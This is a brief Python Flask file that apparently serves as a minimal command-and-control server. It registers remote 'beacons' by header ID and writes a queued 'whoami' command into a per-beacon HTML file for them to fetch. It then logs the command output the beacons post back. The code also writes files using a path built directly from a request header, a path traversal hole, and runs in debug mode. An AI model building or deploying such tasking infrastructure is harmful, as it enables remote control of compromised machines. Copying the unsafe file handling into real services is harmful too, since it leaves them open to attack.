from flask import *

app = Flask(__name__)

@app.route("/")
def home():
    # Grab the appsessionid value from the headers
    val = request.headers['APPSESSIONID']
    print(f'headers:{val}')
    # create a new page for the UUID we got from the headers
    f = open(f"/var/www/html/{val}.html", "a")
    f.write("cmd;whoami;null ")
    f.close()
    return('found')

@app.route('/<path:filename>', methods=['GET', 'POST'])
def index(filename):
    filename = filename or 'index.html'
    if request.method == 'GET':
        val = {request.headers['ID']}
        print(f'Host {val} grabbed command')
        return send_from_directory('.', filename)

    return jsonify(request.data)

@app.route("/returned",methods = ['POST'])
def results():
    if request.method == 'POST':
        val = {request.headers['APPSESSIONID']}
        print(f'Result: {request.data}')
        print(f'From beacon: {val}')
        return 'HELO'

if __name__=="__main__":
   app.run(debug=True)
